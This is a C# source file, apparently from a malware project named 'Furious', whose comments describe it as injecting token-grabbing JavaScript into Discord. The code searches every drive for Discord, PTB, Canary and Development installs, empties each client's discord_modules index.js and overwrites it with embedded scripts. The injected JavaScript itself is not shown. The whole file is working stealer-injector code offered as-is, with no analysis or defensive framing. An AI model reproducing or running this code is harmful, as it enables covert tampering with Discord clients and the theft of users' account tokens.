using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;

namespace Furious
{
	/// <summary>
	/// Internal class for managing the different files and folders required to inject the JS into the index.js file.
	/// </summary>
	internal static class FileManagement
	{
		///Clears the targeted file of its contents.
		internal static async Task CleanFile(string filePath)
		{
			try
			{
				using (StreamWriter streamWriter = File.CreateText(filePath))
				{
					await streamWriter.WriteAsync(string.Empty);
				}
				Console.WriteLine(filePath + " cleaned!", Console.ForegroundColor = ConsoleColor.Green);
			}
			catch
			{
				Console.WriteLine("An error occured clearing index.js.", Console.ForegroundColor = ConsoleColor.Red);
			}
		}

		///Writes the token grabbing JavaScript code into available Discord directories.
		internal static async Task WriteDiscord(string filePath, string javascriptPath, string value = null)
		{
			if (File.Exists(filePath))
			{
				try
				{
					await CleanFile(filePath);

					using (StreamReader reader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream(javascriptPath)))
					{
						value = await reader.ReadToEndAsync();
						Console.WriteLine("js read successfully...", Console.ForegroundColor = ConsoleColor.Green);
					}
					using (StreamWriter writer = File.CreateText(filePath))
                    			{
						await writer.WriteAsync(value);
						Console.WriteLine(filePath + " written!", Console.ForegroundColor = ConsoleColor.Green);
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString(), Console.ForegroundColor = ConsoleColor.Red);
				}
			}
		}

		///This method is used to write the token grabbing JavaScript code into the Discord directory.
		internal static async Task InjectJS()
		{
			foreach (var drive in Environment.GetLogicalDrives())
            		{
				await ProcessDirectory($@"{drive}Users\{Environment.UserName}\AppData\Local\Discord", "Furious.Resources.index.txt");

				await ProcessDirectory($@"{drive}Users\{Environment.UserName}\AppData\Local\DiscordPTB", "Furious.Resources.ptb.txt");

				await ProcessDirectory($@"{drive}Users\{Environment.UserName}\AppData\Local\DiscordCanary", "Furious.Resources.canary.txt");

				await ProcessDirectory($@"{drive}Users\{Environment.UserName}\AppData\Local\DiscordDevelopment", "Furious.Resources.development.txt");
			}
		}

		/// Searches within the available Discord directories for the version folder, 
		/// then navigates to the index.js file to replace the code with the token grabber.
		internal static async Task ProcessDirectory(string dirPath, string javascriptPath)
		{
			if (Directory.Exists(dirPath))
			{
				Console.WriteLine(dirPath + " exists!", Console.ForegroundColor = ConsoleColor.Green);

				string[] discord = Directory.GetDirectories(dirPath);
				foreach (string folderName in discord)
				{
					if (folderName.Contains("0."))
					{
						string DiscordPath = folderName + @"\modules\discord_modules-1\discord_modules\index.js";
						await WriteDiscord(DiscordPath, javascriptPath);
					}
				}
			}
			else
            		{
				Console.WriteLine(dirPath + " does NOT exist!", Console.ForegroundColor = ConsoleColor.DarkYellow);
			}
		}
	}
}
